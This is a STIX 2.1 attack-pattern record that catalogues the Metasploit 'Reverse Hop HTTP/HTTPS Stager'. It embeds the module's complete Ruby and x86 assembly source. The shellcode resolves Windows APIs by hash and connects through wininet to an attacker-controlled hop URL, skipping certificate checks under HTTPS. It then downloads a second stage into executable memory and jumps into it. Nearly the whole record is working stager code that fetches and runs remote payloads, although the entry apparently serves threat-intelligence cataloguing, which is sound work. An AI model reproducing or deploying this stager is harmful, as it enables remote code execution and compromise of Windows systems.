{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6ae6a6e3-620d-4442-8f2c-7ed7b2806c7c",
    "created": "2024-08-14T16:33:19.483966Z",
    "modified": "2024-08-14T16:33:19.483969Z",
    "name": "Reverse Hop HTTP/HTTPS Stager",
    "description": " Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop/hop.php to the PHP server you wish to use as a hop. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stagers/windows/reverse_hop_http.rb",
            "external_id": "reverse_hop_http.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'uri'\n\nmodule MetasploitModule\n\n  CachedSize = 353\n\n  include Msf::Payload::Stager\n  include Msf::Payload::Windows\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'           => 'Reverse Hop HTTP/HTTPS Stager',\n      'Description'    => %q{\n        Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload\n        data/hop/hop.php to the PHP server you wish to use as a hop.\n      },\n      'Author'         => [\n         'scriptjunkie <scriptjunkie[at]scriptjunkie.us>',\n         'bannedit',\n         'hdm'\n        ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'win',\n      'Arch'           => ARCH_X86,\n      'Handler'        => Msf::Handler::ReverseHopHttp,\n      'Convention'     => 'sockedi http',\n      'DefaultOptions' => { 'WfsDelay' => 30 },\n      'Stager'         => { 'Offsets' => { } }))\n\n    deregister_options('LHOST', 'LPORT')\n\n    register_options([\n      OptString.new('HOPURL', [ true, \"The full URL of the hop script\", \"http://example.com/hop.php\" ]\n      )\n    ])\n  end\n\n  #\n  # Do not transmit the stage over the connection.  We handle this via HTTP\n  #\n  def stage_over_connection?\n    false\n  end\n\n  #\n  # Generate the transport-specific configuration\n  #\n  def transport_config(opts={})\n    config = transport_config_reverse_http(opts)\n    config[:scheme] = URI(datastore['HOPURL']).scheme\n    config\n  end\n\n  #\n  # Generate the first stage\n  #\n  def generate(_opts = {})\n    uri = URI(datastore['HOPURL'])\n    #create actual payload\n    payload_data = <<EOS\n  cld            ; clear direction flag\n  call start        ; start main routine\n; Stephen Fewer's block_api\n; block_api code (Stephen Fewer)\napi_call:\n  pushad                 ; We preserve all the registers for the caller, bar EAX and ECX.\n  mov ebp, esp           ; Create a new stack frame\n  xor edx, edx           ; Zero EDX\n  mov edx, fs:[edx+48]   ; Get a pointer to the PEB\n  mov edx, [edx+12]      ; Get PEB->Ldr\n  mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list\nnext_mod:\n  mov esi, [edx+40]      ; Get pointer to modules name (unicode string)\n  movzx ecx, word [edx+38] ; Set ECX to the length we want to check\n  xor edi, edi           ; Clear EDI which will store the hash of the module name\nloop_modname:            ;\n  xor eax, eax           ; Clear EAX\n  lodsb                  ; Read in the next byte of the name\n  cmp al, 'a'            ; Some versions of Windows use lower case module names\n  jl not_lowercase       ;\n  sub al, 0x20           ; If so normalise to uppercase\nnot_lowercase:           ;\n  ror edi, 13            ; Rotate right our hash value\n  add edi, eax           ; Add the next byte of the name\n  loop loop_modname      ; Loop until we have read enough\n  ; We now have the module hash computed\n  push edx               ; Save the current position in the module list for later\n  push edi               ; Save the current module hash for later\n  ; Proceed to iterate the export address table,\n  mov edx, [edx+16]      ; Get this modules base address\n  mov eax, [edx+60]      ; Get PE header\n  add eax, edx           ; Add the modules base address\n  mov eax, [eax+120]     ; Get export tables RVA\n  test eax, eax          ; Test if no export address table is present\n  jz get_next_mod1       ; If no EAT present, process the next module\n  add eax, edx           ; Add the modules base address\n  push eax               ; Save the current modules EAT\n  mov ecx, [eax+24]      ; Get the number of function names\n  mov ebx, [eax+32]      ; Get the rva of the function names\n  add ebx, edx           ; Add the modules base address\n  ; Computing the module hash + function hash\nget_next_func:           ;\n  jecxz get_next_mod     ; When we reach the start of the EAT (we search backwards) process next mod\n  dec ecx                ; Decrement the function name counter\n  mov esi, [ebx+ecx*4]   ; Get rva of next module name\n  add esi, edx           ; Add the modules base address\n  xor edi, edi           ; Clear EDI which will store the hash of the function name\n  ; And compare it to the one we want\nloop_funcname:           ;\n  xor eax, eax           ; Clear EAX\n  lodsb                  ; Read in the next byte of the ASCII function name\n  ror edi, 13            ; Rotate right our hash value\n  add edi, eax           ; Add the next byte of the name\n  cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)\n  jne loop_funcname      ; If we have not reached the null terminator, continue\n  add edi, [ebp-8]       ; Add the current module hash to the function hash\n  cmp edi, [ebp+36]      ; Compare the hash to the one we are searchnig for\n  jnz get_next_func      ; Go compute the next function hash if we have not found it\n  ; If found, fix up stack, call the function and then value else compute the next one...\n  pop eax                ; Restore the current modules EAT\n  mov ebx, [eax+36]      ; Get the ordinal table rva\n  add ebx, edx           ; Add the modules base address\n  mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal\n  mov ebx, [eax+28]      ; Get the function addresses table rva\n  add ebx, edx           ; Add the modules base address\n  mov eax, [ebx+4*ecx]   ; Get the desired functions RVA\n  add eax, edx           ; Add the modules base address to get the functions actual VA\n  ; We now fix up the stack and perform the call to the desired function...\nfinish:\n  mov [esp+36], eax      ; Overwrite the old EAX value with the desired api address\n  pop ebx                ; Clear off the current modules hash\n  pop ebx                ; Clear off the current position in the module list\n  popad                  ; Restore all of the callers registers, bar EAX, ECX and EDX\n  pop ecx                ; Pop off the origional return address our caller will have pushed\n  pop edx                ; Pop off the hash value our caller will have pushed\n  push ecx               ; Push back the correct return value\n  jmp eax                ; Jump into the required function\n  ; We now automagically return to the correct caller...\nget_next_mod:            ;\n  pop eax                ; Pop off the current (now the previous) modules EAT\nget_next_mod1:           ;\n  pop edi                ; Pop off the current (now the previous) modules hash\n  pop edx                ; Restore our position in the module list\n  mov edx, [edx]         ; Get the next module\n  jmp.i8 next_mod        ; Process this module\n\n; actual routine\nstart:\n  pop ebp            ; get ptr to block_api routine\n\n; Input: EBP must be the address of 'api_call'.\n; Output: EDI will be the socket for the connection to the server\n; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)\nload_wininet:\n  push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.\n  push 0x696e6977        ; ...\n  push esp               ; Push a pointer to the \"wininet\" string on the stack.\n  push 0x0726774C        ; hash( \"kernel32.dll\", \"LoadLibraryA\" )\n  call ebp               ; LoadLibraryA( \"wininet\" )\n\ninternetopen:\n  xor edi,edi\n  push edi               ; DWORD dwFlags\n  push edi               ; LPCTSTR lpszProxyBypass\n  push edi               ; LPCTSTR lpszProxyName\n  push edi               ; DWORD dwAccessType (PRECONFIG = 0)\n  push 0                 ; NULL pointer\n  push esp               ; LPCTSTR lpszAgent (\"\\x00\")\n  push 0xA779563A        ; hash( \"wininet.dll\", \"InternetOpenA\" )\n  call ebp\n\n  jmp.i8 dbl_get_server_host\n\ninternetconnect:\n  pop ebx                ; Save the hostname pointer\n  xor ecx, ecx\n  push ecx               ; DWORD_PTR dwContext (NULL)\n  push ecx               ; dwFlags\n  push 3                 ; DWORD dwService (INTERNET_SERVICE_HTTP)\n  push ecx               ; password\n  push ecx               ; username\n  push #{uri.port} ; PORT\n  push ebx               ; HOSTNAME\n  push eax               ; HINTERNET hInternet\n  push 0xC69F8957        ; hash( \"wininet.dll\", \"InternetConnectA\" )\n  call ebp\n\n  jmp get_server_uri\n\nhttpopenrequest:\n  pop ecx\n  xor edx, edx           ; NULL\n  push edx               ; dwContext (NULL)\nEOS\n\n    if uri.scheme == 'http'\n      payload_data << '  push (0x80000000 | 0x04000000 | 0x00200000 | 0x00000200 | 0x00400000) ; dwFlags'\n    else\n      payload_data << '  push (0x80000000 | 0x00800000 | 0x00001000 | 0x00002000 | 0x04000000 | 0x00200000 | 0x00000200 | 0x00400000) ; dwFlags'\n    end\n    # 0x80000000 |        ; INTERNET_FLAG_RELOAD\n    # 0x00800000 |        ; INTERNET_FLAG_SECURE\n    # 0x00001000 |        ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID\n    # 0x00002000 |        ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID\n    # 0x80000000 |        ; INTERNET_FLAG_RELOAD\n    # 0x04000000 |        ; INTERNET_NO_CACHE_WRITE\n    # 0x00200000 |        ; INTERNET_FLAG_NO_AUTO_REDIRECT\n    # 0x00000200 |        ; INTERNET_FLAG_NO_UI\n    # 0x00400000          ; INTERNET_FLAG_KEEP_CONNECTION\n    payload_data << <<EOS\n\n  push edx               ; accept types\n  push edx               ; referrer\n  push edx               ; version\n  push ecx               ; url\n  push edx               ; method\n  push eax               ; hConnection\n  push 0x3B2E55EB        ; hash( \"wininet.dll\", \"HttpOpenRequestA\" )\n  call ebp\n  mov esi, eax           ; hHttpRequest\n\nset_retry:\n  push 0x10\n  pop ebx\n\nhttpsendrequest:\n  xor edi, edi\n  push edi               ; optional length\n  push edi               ; optional\n  push edi               ; dwHeadersLength\n  push edi               ; headers\n  push esi               ; hHttpRequest\n  push 0x7B18062D        ; hash( \"wininet.dll\", \"HttpSendRequestA\" )\n  call ebp\n  test eax,eax\n  jnz allocate_memory\n\ntry_it_again:\n  dec ebx\n  jz failure\n\nEOS\n    if uri.scheme == 'https'\n      payload_data << <<EOS\nset_security_options:\n  push 0x00003380\n    ;0x00002000 |        ; SECURITY_FLAG_IGNORE_CERT_DATE_INVALID\n    ;0x00001000 |        ; SECURITY_FLAG_IGNORE_CERT_CN_INVALID\n    ;0x00000200 |        ; SECURITY_FLAG_IGNORE_WRONG_USAGE\n    ;0x00000100 |        ; SECURITY_FLAG_IGNORE_UNKNOWN_CA\n    ;0x00000080          ; SECURITY_FLAG_IGNORE_REVOCATION\n  mov eax, esp\n  push 0x04                 ; sizeof(dwFlags)\n  push eax               ; &dwFlags\n  push 0x1f              ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)\n  push esi               ; hRequest\n  push 0x869E4675        ; hash( \"wininet.dll\", \"InternetSetOptionA\" )\n  call ebp\n\nEOS\n  end\n  payload_data << <<EOS\n  jmp.i8 httpsendrequest\n\ndbl_get_server_host:\n  jmp get_server_host\n\nget_server_uri:\n  call httpopenrequest\n\nserver_uri:\n db \"#{Rex::Text.hexify(uri.request_uri, 99999).strip}?/12345\", 0x00\n\nfailure:\n  push 0x56A2B5F0        ; hardcoded to exitprocess for size\n  call ebp\n\nallocate_memory:\n  push 0x40         ; PAGE_EXECUTE_READWRITE\n  push 0x1000            ; MEM_COMMIT\n  push 0x00400000        ; Stage allocation (8Mb ought to do us)\n  push edi               ; NULL as we dont care where the allocation is\n  push 0xE553A458        ; hash( \"kernel32.dll\", \"VirtualAlloc\" )\n  call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );\n\ndownload_prep:\n  xchg eax, ebx          ; place the allocated base address in ebx\n  push ebx               ; store a copy of the stage base address on the stack\n  push ebx               ; temporary storage for bytes read count\n  mov edi, esp           ; &bytesRead\n\ndownload_more:\n  push edi               ; &bytesRead\n  push 8192              ; read length\n  push ebx               ; buffer\n  push esi               ; hRequest\n  push 0xE2899612        ; hash( \"wininet.dll\", \"InternetReadFile\" )\n  call ebp\n\n  test eax,eax           ; download failed? (optional?)\n  jz failure\n\n  mov eax, [edi]\n  add ebx, eax           ; buffer += bytes_received\n\n  test eax,eax           ; optional?\n  jnz download_more      ; continue until it returns 0\n  pop eax                ; clear the temporary storage\n\nexecute_stage:\n  ret                    ; dive into the stored stage address\n\nget_server_host:\n  call internetconnect\n\nserver_host:\ndb \"#{Rex::Text.hexify(uri.host, 99999).strip}\", 0x00\n\nEOS\n    self.module_info['Stager']['Assembly'] = payload_data.to_s\n    super\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}